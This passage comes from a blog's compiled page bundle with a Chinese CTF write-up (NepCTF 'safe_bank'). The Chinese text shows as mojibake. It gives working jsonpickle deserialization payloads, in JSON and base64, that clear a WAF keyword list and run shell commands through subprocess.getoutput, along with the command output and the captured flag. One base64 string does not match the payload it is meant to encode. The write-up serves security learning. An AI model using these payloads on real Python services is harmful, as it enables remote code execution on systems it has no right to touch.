<span class="line">        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&#39;error.html&#39;</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f&quot;æ•°æ®è§£ç å¤±è´¥ã€‚&quot;</span></span><span class="token punctuation">)</span></span>
<span class="line"></span>
<span class="line"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">&#39;/vault&#39;</span><span class="token punctuation">)</span></span>
<span class="line"><span class="token keyword">def</span> <span class="token function">vault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">    token <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;authz&quot;</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token keyword">if</span> <span class="token keyword">not</span> token<span class="token punctuation">:</span></span>
<span class="line">        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">&#39;root&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span>
<span class="line">    </span>
<span class="line">    <span class="token keyword">try</span><span class="token punctuation">:</span></span>
<span class="line">        decoded <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>token<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span></span>
<span class="line">        <span class="token keyword">if</span> waf<span class="token punctuation">(</span>decoded<span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&#39;error.html&#39;</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">&quot;è¯·ä¸è¦å°è¯•é»‘å®¢æ”»å‡»ï¼&quot;</span><span class="token punctuation">)</span></span>
<span class="line">        sess_obj <span class="token operator">=</span> jsonpickle<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>decoded<span class="token punctuation">,</span> safe<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></span>
<span class="line">        meta <span class="token operator">=</span> sess_obj<span class="token punctuation">.</span>meta</span>
<span class="line">        </span>
<span class="line">        <span class="token keyword">if</span> meta<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;user&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">&quot;admin&quot;</span><span class="token punctuation">:</span></span>
<span class="line">            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&#39;error.html&#39;</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token string">&quot;è®¿é—®è¢«æ‹’ç»ã€‚åªæœ‰ç®¡ç†å‘˜æ‰èƒ½æŸ¥çœ‹æ­¤é¡µé¢ã€‚&quot;</span><span class="token punctuation">)</span></span>
<span class="line">        </span>
<span class="line">        flag <span class="token operator">=</span> <span class="token string">&quot;NepCTF{fake_flag_this_is_not_the_real_one}&quot;</span></span>
<span class="line">        </span>
<span class="line">        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&#39;vault.html&#39;</span><span class="token punctuation">,</span> flag<span class="token operator">=</span>flag<span class="token punctuation">)</span></span>
<span class="line">    <span class="token keyword">except</span><span class="token punctuation">:</span></span>
<span class="line">        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">&#39;root&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span>
<span class="line"></span>
<span class="line"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">&#39;/about&#39;</span><span class="token punctuation">)</span></span>
<span class="line"><span class="token keyword">def</span> <span class="token function">about</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&#39;about.html&#39;</span><span class="token punctuation">)</span></span>
<span class="line"></span>
<span class="line"><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span></span>
<span class="line">    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">&#39;0.0.0.0&#39;</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8000</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹ æˆ‘ä»¬å¯ä»¥è°ƒç”¨åˆ¶å®šæ–¹æ³•ï¼Œæˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨<code>__main__.FORBIDDEN.clear()</code>ç›´æ¥æŠŠå±è”½è¯æ‰¬äº†</p><blockquote><p>Provided by Pid</p></blockquote><p>â€‹ Payloadå¦‚ä¸‹ï¼š</p><div class="language-json line-numbers-mode" data-highlighter="prismjs" data-ext="json"><pre><code><span class="line"><span class="token punctuation">{</span><span class="token property">&quot;py/object&quot;</span><span class="token operator">:</span> <span class="token string">&quot;__main__.Session&quot;</span><span class="token punctuation">,</span> <span class="token property">&quot;meta&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">&quot;user&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">&quot;py/object&quot;</span><span class="token operator">:</span> <span class="token string">&quot;__main__.FORBIDDEN.clear&quot;</span><span class="token punctuation">,</span> <span class="token property">&quot;py/newargs&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token property">&quot;ts&quot;</span><span class="token operator">:</span> <span class="token number">1753451910</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line">eyJweS9vYmplY3QiOiAiX19tYWluX18uU2Vzc2lvbiIsICJtZXRhIjogeyJ1c2VyIjogeyJweS9vYmplY3QiOiAiX19tYWluX18uRk9SQklEREVOLmNsZWFyIiwgInB5L25ld2FyZ3MiOiBbXX0sICJ0cyI6IDE3NTM0NTE5MTB9fQ==</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹ æ‰§è¡Œä¹‹åå±è”½è¯å°±æ²¡äº†ğŸ˜‹</p><div class="language-json line-numbers-mode" data-highlighter="prismjs" data-ext="json"><pre><code><span class="line"><span class="token punctuation">{</span><span class="token property">&quot;py/object&quot;</span><span class="token operator">:</span> <span class="token string">&quot;__main__.Session&quot;</span><span class="token punctuation">,</span> <span class="token property">&quot;meta&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">&quot;user&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">&quot;py/object&quot;</span><span class="token operator">:</span> <span class="token string">&quot;subprocess.getoutput&quot;</span><span class="token punctuation">,</span> <span class="token property">&quot;py/newargs&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">&quot;ls /&quot;</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token property">&quot;ts&quot;</span><span class="token operator">:</span> <span class="token number">1753451910</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line">eyJweS9vYmplY3QiOiAiX19tYWluX18uU2Vzc2lvbiIsICJtZXRhIjogeyJ1c2VyIjogeyJweS9vYmplY3QiOiAic3VicHJvY2Vzcy5nZXRvdXRwdXQiLCAicHkvbmV3YXJncyI6IFsibHMgLyJdfSwgInRzIjogMTc1MzQ1MTkxMH19</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh"><pre><code><span class="line">ç”¨æˆ·å:</span>
<span class="line">app bin boot dev entrypoint.sh etc flag home lib lib64 media mnt opt proc readflag root run sbin srv sys tmp usr var</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹ æ‰§è¡Œ<code>/readflag</code>å³å¯è·å¾—flag</p><div class="language-json line-numbers-mode" data-highlighter="prismjs" data-ext="json"><pre><code><span class="line"><span class="token punctuation">{</span><span class="token property">&quot;py/object&quot;</span><span class="token operator">:</span> <span class="token string">&quot;__main__.Session&quot;</span><span class="token punctuation">,</span> <span class="token property">&quot;meta&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">&quot;user&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">&quot;py/object&quot;</span><span class="token operator">:</span> <span class="token string">&quot;subprocess.getoutput&quot;</span><span class="token punctuation">,</span> <span class="token property">&quot;py/newargs&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">&quot;/readflag&quot;</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token property">&quot;ts&quot;</span><span class="token operator">:</span> <span class="token number">1753451910</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line">eyJweS9vYmplY3QiOiAiX19tYWluX18uU2Vzc2lvbiIsICJtZXRhIjogeyJ1c2VyIjogeyJweS9vYmplY3QiOiAic3VicHJvY2Vzcy5nZXRvdXRwdXQiLCAicHkvbmV3YXJncyI6IFsibHMgLyJdfSwgInRzIjogMTc1MzQ1MTkxMH19</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh"><pre><code><span class="line">ç”¨æˆ·å:</span>
<span class="line">NepCTF<span class="token punctuation">{</span>d08fb277-1a51-fd9d-39aa-98cad01a05d7<span class="token punctuation">}</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div>`,28)])])}const i=s(e,[["render",o]]),u=JSON.parse('{"path":"/posts/SafeBank.html","title":"safe_bank","lang":"en-US","frontmatter":{"date":"2026-01-12T00:00:00.000Z","category":["CTF"],"tag":["CTF","Web","NepCTF"]},"headers":[],"git":{"updatedTime":1768209794000,"contributors":[{"name":"songsanggggg","username":"songsanggggg","email":"bxgh6_xivkv71ra8@163.com","commits":1,"url":"https://github.com/songsanggggg"}],"changelog":[{"hash":"0d73b435a5512223af81ac802dde9a8912303abd","time":1768209794000,"email":"bxgh6_xivkv71ra8@163.com","author":"songsanggggg","message":"2026/01/12"}]},"filePathRelative":"posts/SafeBank.md","excerpt":"\\n<p>â€‹\\tæœ¬é¢˜æ˜¯åœ¨Nepctfä¸­é‡åˆ°äº†ä¸€é“é¢˜ï¼Œæ˜¯æ¥è§¦CTFä¸ä¹…çš„ä¸€æ¬¡æ¯”èµ›ï¼Œæ˜¯æˆ‘ç¬¬ä¸€æ¬¡æ¥è§¦jsonpickleååºåˆ—åŒ–ï¼Œå…¶ä¸­clearçš„æ€è·¯æ¥è‡ªPid,å±äºéé¢„æœŸè§£ï¼Œä½†æ˜¯æ˜¯çœŸä¸å¥½æƒ³å•ŠğŸ˜­ã€‚</p>\\n<p>â€‹\\té¢˜ç›®ä¸­æè¿°å¦‚ä¸‹ï¼š</p>\\n<div class=\\"language-text line-numbers-mode\\" data-highlighter=\\"prismjs\\" data-ext=\\"text\\"><pre><code><span class=\\"line\\">Python Flaskä½œä¸ºWebæ¡†æ¶</span>\\n<span class=\\"line\\">JSONç”¨äºæ•°æ®äº¤æ¢</span>\\n<span class=\\"line\\">ä½¿ç”¨jsonpickleçš„é«˜çº§ä¼šè¯ç®¡ç†</span>\\n<span class=\\"line\\">Base64ç¼–ç ç”¨äºTokenä¼ è¾“</span>\\n<span class=\\"line\\"></span></code></pre>\\n<div class=\\"line-numbers\\" aria-hidden=\\"true\\" style=\\"counter-reset:line-number 0\\"><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div></div></div>"}');export{i as comp,u as data};
